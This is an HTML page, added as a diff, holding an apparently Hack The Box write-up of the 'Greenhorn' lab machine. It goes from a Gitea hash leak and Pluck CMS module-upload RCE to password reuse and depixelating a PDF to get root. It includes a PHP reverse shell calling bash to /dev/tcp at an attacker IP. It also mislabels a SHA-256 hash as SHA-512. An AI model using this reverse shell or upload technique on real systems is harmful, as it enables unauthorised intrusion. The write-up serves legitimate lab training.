@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Greenhorn — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><img src="greenhorn-badge.png" alt="Greenhorn" style="width:120px;height:120px;border-radius:50%;margin-bottom:1rem;border:2px solid var(--border);"><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='greenhorn'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-greenhorn','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-greenhorn')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div style="display:flex;align-items:center;gap:1.5rem;"><img src="greenhorn-badge.png" alt="Greenhorn" style="width:80px;height:80px;border-radius:50%;border:2px solid var(--border);"><div><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Greenhorn</span></h1></div></div><div class="hero-meta" style="margin-top:1.2rem;"><span>OS <strong>Linux</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>22 · 80 · 3000</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Gitea hash leak → Pluck RCE</span><span class="chain-arrow">→</span><span class="chain-node blue">Password reuse → SSH junior</span><span class="chain-arrow">→</span><span class="chain-node red">Pixelated PDF password → su root</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.230.13</span>
+<span class="output">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
+80/tcp   open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://greenhorn.htb/
+<span class="highlight">3000/tcp open  http</span>    Gitea (Git with a cup of tea)</span></code></pre>
+
+<p>Port 80 redirects to <code>greenhorn.htb</code> — running <strong>Pluck CMS 4.7.18</strong>. Port 3000 hosts a <strong>Gitea</strong> instance (self-hosted Git). Add <code>greenhorn.htb</code> to <code>/etc/hosts</code>.</p>
+
+<h3>Gitea Exploration</h3>
+<p>Gitea at <code>http://greenhorn.htb:3000</code> has a public repository. Browse the code to find the Pluck CMS configuration file containing a SHA-512 password hash:</p>
+
+<pre><code><span class="cmd">http://greenhorn.htb:3000/GreenAdmin/GreenHorn/src/branch/main/data/settings/pass.php</span>
+<span class="output">&lt;?php
+$ww = '<span class="highlight">d5443aef1b64544f3685571c71e6d1c4a4302fb55b35f5b7cc2e872f0b1e7591</span>';
+?&gt;</span></code></pre>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Hash Crack → Pluck CMS RCE</h2></div>
+
+<h3>Crack the SHA-512 Hash</h3>
+<pre><code><span class="cmd">$ echo 'd5443aef1b64544f3685571c71e6d1c4a4302fb55b35f5b7cc2e872f0b1e7591' > hash.txt</span>
+
+<span class="comment"># Identify hash type — 64 hex chars = SHA-256</span>
+<span class="cmd">$ hashcat -m 1400 hash.txt /usr/share/wordlists/rockyou.txt</span>
+<span class="output">d5443aef1b64544f...:<span class="highlight">iloveyou1</span></span></code></pre>
+
+<h3>Login to Pluck CMS</h3>
+<pre><code><span class="comment"># Pluck admin login page</span>
+<span class="cmd">http://greenhorn.htb/login.php</span>
+<span class="highlight">Password: iloveyou1</span></code></pre>
+
+<h3>Pluck 4.7.18 RCE — Malicious Module Upload</h3>
+<p>Pluck CMS 4.7.18 allows uploading ZIP modules that can contain PHP files. Create a malicious module:</p>
+
+<pre><code><span class="comment"># Step 1: Create PHP reverse shell</span>
+<span class="cmd">$ mkdir -p shell_module
+$ cat &lt;&lt; 'EOF' &gt; shell_module/shell.php
+&lt;?php
+exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.15/9001 0&gt;&amp;1'");
+?&gt;
+EOF</span>
+
+<span class="comment"># Step 2: Package as ZIP</span>
+<span class="cmd">$ cd shell_module && zip ../shell.zip shell.php && cd ..</span>
+
+<span class="comment"># Step 3: Start listener</span>
+<span class="cmd">$ nc -lvnp 9001</span></code></pre>
+
+<p>In the Pluck admin panel:</p>
+<p>1. Navigate to <strong>Options → Manage modules</strong></p>
+<p>2. Click <strong>Install a module</strong></p>
+<p>3. Upload <code>shell.zip</code></p>
+<p>4. Trigger the shell by visiting:</p>
+
+<pre><code><span class="cmd">http://greenhorn.htb/data/modules/shell/shell.php</span>
+
+<span class="output">www-data@greenhorn:~$</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Lateral Movement — www-data → junior</h2></div>
+
+<h3>Password Reuse</h3>
+<pre><code><span class="cmd">www-data@greenhorn:~$ grep bash /etc/passwd</span>
+<span class="output">root:x:0:0:root:/root:/bin/bash
+<span class="highlight">junior</span>:x:1000:1000::/home/junior:/bin/bash</span>
+
+<span class="comment"># The Pluck CMS password works for SSH</span>
+<span class="cmd">$ ssh junior@greenhorn.htb</span>
+<span class="output">Password: iloveyou1</span>
+
+<span class="cmd">junior@greenhorn:~$ cat user.txt</span>
+<span class="output">b0b40acbbb00a2d04a6d149d5cbf8ed4</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — Pixelated PDF Password Recovery</h2></div>
+
+<h3>Finding the Clue</h3>
+<pre><code><span class="cmd">junior@greenhorn:~$ ls -la</span>
+<span class="output">-rw-r----- 1 root junior 33 ... user.txt
+-rw-r----- 1 root junior <span class="highlight">61367 ... Using OpenVAS.pdf</span></span></code></pre>
+
+<p>The PDF is a guide for using OpenVAS. Inside, there's a page showing the root password — but it's been <strong>pixelated</strong> (blacked out with a mosaic filter). Pixelation is <strong>not</strong> a secure redaction method.</p>
+
+<h3>Depixelation Attack</h3>
+<pre><code><span class="comment"># Step 1: Transfer the PDF to attacker machine</span>
+<span class="cmd">junior@greenhorn:~$ python3 -m http.server 8888</span>
+<span class="cmd">$ wget http://greenhorn.htb:8888/Using\ OpenVAS.pdf</span>
+
+<span class="comment"># Step 2: Extract the pixelated password image from the PDF</span>
+<span class="comment"># Open the PDF, screenshot the pixelated region, save as password.png</span>
+
+<span class="comment"># Step 3: Use Depix to recover the original text</span>
+<span class="cmd">$ git clone https://github.com/spipm/Depix.git
+$ cd Depix
+$ python3 depix.py \
+    -p ../password.png \
+    -s images/searchimages/debruijn.png \
+    -o ../recovered.png</span>
+
+<span class="comment"># Step 4: View the recovered image</span>
+<span class="cmd">$ xdg-open ../recovered.png</span>
+<span class="output"><span class="highlight">sidefromsidetheothersidesidefromsidetheotherside</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">Why depixelation works</span>
+Pixelation replaces blocks of pixels with their average color. This is a lossy but deterministic transformation — the same input text with the same font always produces the same pixelated output. Depix works by comparing the pixelated blocks against a pre-computed lookup table of known character pixelation patterns. It's not 100% accurate, but for short strings with common fonts, it often recovers enough to guess the original text.
+</div>
+
+<h3>Root</h3>
+<pre><code><span class="cmd">junior@greenhorn:~$ su root</span>
+<span class="output">Password: sidefromsidetheothersidesidefromsidetheotherside</span>
+
+<span class="cmd">root@greenhorn:~# cat /root/root.txt</span>
+<span class="output">7a2b39d60fbc75cd4aee50137e876936</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Public Git repos leak credentials.</strong><p>Gitea hosted the Pluck CMS source code including the password hash in <code>pass.php</code>. Always check for public repos on Gitea, GitLab, and similar self-hosted platforms.</p></div>
+<div class="takeaway-item"><strong>CMS module upload = code execution.</strong><p>Pluck, WordPress, Backdrop, Drupal — the pattern is identical: package a PHP shell as a module/plugin ZIP, upload through the admin panel, access the PHP file directly. This is a universal CMS attack vector.</p></div>
+<div class="takeaway-item"><strong>Pixelation is NOT secure redaction.</strong><p>Pixelated text can be recovered with tools like Depix. For secure redaction, use solid black rectangles that completely replace the underlying content — never use blur, pixelation, or semi-transparent overlays.</p></div>
+<div class="takeaway-item"><strong>Always check home directory files carefully.</strong><p>The PDF in junior's home directory was the key to root. Don't just grab <code>user.txt</code> and move on — enumerate every file in the user's home.</p></div>
+<div class="takeaway-item"><strong>Password reuse chains through the entire box.</strong><p><code>iloveyou1</code> worked for Pluck CMS, Gitea, and SSH. One cracked hash unlocked three services.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">Gitea hash</span><span class="arrow">→</span><span class="node node-green">crack → Pluck login</span><span class="arrow">→</span><span class="node node-green">module upload RCE</span><span class="arrow">→</span><span class="node node-blue">SSH junior</span><span class="arrow">→</span><span class="node node-red">depixelate PDF → root</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Greenhorn Writeup · 2026</footer>
+</body></html>
